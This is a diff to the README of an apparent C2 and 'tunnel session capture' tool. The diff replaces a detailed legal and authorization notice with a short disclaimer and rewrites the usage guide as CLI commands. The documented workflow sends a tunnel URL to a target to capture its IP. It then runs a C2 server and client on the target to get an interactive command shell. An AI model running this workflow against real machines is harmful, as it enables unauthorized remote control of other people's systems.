@@ -12,25 +12,6 @@ It allows you to:
 -   Manage sessions interactively via CLI
 
 ------------------------------------------------------------------------
-## ⚠️ IMPORTANT LEGAL & ETHICAL NOTICE
-
-**This tool is provided STRICTLY for:**
-
-- Educational purposes (learning networking, sockets, tunneling, etc.)
-- Authorized penetration testing / red teaming **with explicit written permission** from the system owner
-- Internal lab environments and controlled security exercises
-
-**Unauthorized use is illegal** — including (but not limited to):
-
-- Targeting systems you do not own
-- Using without clear, documented consent
-- Any form of real-world deployment without authorization
-
-This may violate laws such as the Computer Fraud and Abuse Act (CFAA) in the US or equivalent legislation in other countries.
-
-**The author(s) accept NO responsibility or liability for misuse.**
-
-------------------------------------------------------------------------
 
 # ⚙️ Requirements
 
@@ -50,96 +31,101 @@ Run Command into you Terminal to Install
 ------------------------------------------------------------------------
 
 # 🔥 Usage Guide
-first of all if we need to use server & client before that we need to create session with target machine I will mention below how thing work.
+### Quick Start
+The tool uses a command-line interface for all operations:
  
-- How To Create Session
-- How to start server
-- How to start client
+### Basic Commands
 
-## Menu
-
-    root@terminal> python main.py
-    0: exit
-    1: List target sessions
-    2. Refresh session list
-    3. create new target session
-
-
-## How To Create Session
-First we need to create session wit target machine
-
-### Step 1 --  Select Tunnel Provider (Select 3 from menu)
-
-    Select tunnel provider:
-    1: ngrok
-    2: cloudflared
-    3. localtunnel
-### Step 2 -- Public URL
-send public URL to target machine for capturing the info into session. when target machine open the URL into browser after getting there session info server automatically close 
-
-find this to in terminal 
-
-    public: url
-    your url is: url
-
-## How To Start Server
-Start Listening server on our just send message to client and get response back
-
-###  Step 1 -- Select 1 to Get List of Session
-I am displaying local IP due to security purpose  don't worry session list show the public IP instead of local IP
-
-    [1] 192.168.0.0
-    [2] 192.168.0.7
-    [3] 192.168.0.8
-    etc....
-    pick session number: you can add by number example 1
+    python  main.py  -h
     
-
-### Step 2 -- After Selecting Session from list  
-
-    Select Ip Option:
-    0: exit
-    1: Localhost (192.168.0.7)
-    2: Public IP (**.***.***.165)
-    3: Use IP 0.0.0.0
-    Enter Ip Option: 1
+    python  main.py  c2  -h
     
-### Step 3 -- Select Port Right after Ip Selection
-Select The Port of target machine
+    python  main.py  session -h
 
-    0: Exit
-    1: Use Default Port (7706)
-    2: Use Custom Port (If you want any port number)
-    Enter Port Option: 1
+## 🎯 C2 Mode (Server/Client Communication)
+### Start C2 Server
+	# Start server on default IP/port (0.0.0.0:7706)
+	python main.py c2 --type server
 
-### Step 4 -- Start Server/Client
-You can run server / client By Chosing one of theme option 
+	# Start server on custom IP/port
+	python main.py c2 --type server --ip 192.168.1.100 --port 8080
+### Start C2 Client
+	# Connect to default server (0.0.0.0:7706)
+	python main.py c2 --type client
 
-    0: Exit
-    1: Start Server
-    2: Start Client
-    Enter C2 Option: 1
+	# Connect to custom server
+	python main.py c2 --type client --ip 192.168.1.100 --port 8080
 
-### On Serve Start
-Now Server is waiting for client 
-
-    [*] Starting SERVER on 192.168.1.7:7706
-    [STARTING] server is starting...
-    [LISTENING] Server is listening on 192.168.1.7:7706
-
-### On Client Start
-
-	[*] Starting CLIENT to 192.168.1.7:7706
-	[STARTING] client is starting...
-	[CONNECTED] Client connected to server
-  
-  ### After Client Started Server Auto Capture the Connection
-
-	[NEW CONNECTION] ('192.168.1.7', port_number) connected to the server
-	[ACTIVE CONNECTIONS] 1
-	[Client] ('192.168.0.0', port_number): ALIVE:DESKTOP-PML7EU0
-	[Server]?>: 
-  
+### C2 Features
+-   **Shell Mode**: Type `shell` to enter interactive shell mode
     
+-   **Exit Shell**: Type exit to leave shell mode
+-   **Command Execution**: Execute system commands on target
+-   **Real-time Communication**: Bidirectional messaging
+
+## 🎣 Session Mode (Tunnel Capture)
+### Create New Session
+	# Create session with tunnel
+	python main.py session --session create
+
+	# Choose tunnel provider when prompted:
+	# 1: ngrok
+	# 2: cloudflared  
+	# 3: localtunnel
+### List Sessions
+	# List all captured sessions
+	python main.py session --session list
+
+## 📋 Complete Workflow
+### Step 1: Create Target Session
+	python main.py session --session create    
+	
+-   Select tunnel provider (ngrok/cloudflared/localtunnel)
+-   Get public URL (e.g., `https://abc123.localtunnel.me`)
+-   Send URL to target machine
+-   Target opens URL → Session captured automatically
+
+### Step 2: List Available Sessions
+	python main.py session --session list
+
+-   View captured sessions with IP addresses
+-   Note the target IP for next step
+
+### Step 3: Start C2 Server
+	python main.py c2 --type server --ip TARGET_IP --port 7706
+
+-   Server starts listening for connections
+-   Wait for client to connect
+
+### Step 4: Start C2 Client (on target machine)
+	python main.py c2 --type client --ip SERVER_IP --port 7706
+
+-   Client connects to server
+-   Communication established
+
+### Step 5: Interact with Target
+-   Type messages to send to target
+-   Type `shell` to enter shell mode
+-   Execute commands like `ls`, `whoami`, etc.
+-   Type exit to leave shell mode
+------------------------------------------------------------------------
+
+# 🛡 Disclaimer
+
+This project is intended for educational and internal communication
+testing purposes only.
+
+The author is not responsible for misuse.
 
 ------------------------------------------------------------------------
+
+# 👨‍💻 Author
+
+Zohaib Ud Din
+GitHub: https://github.com/zohaibdevs/Tunnel-Session-Capture.git
+
+------------------------------------------------------------------------
+
+# 📜 License
+
+MIT License
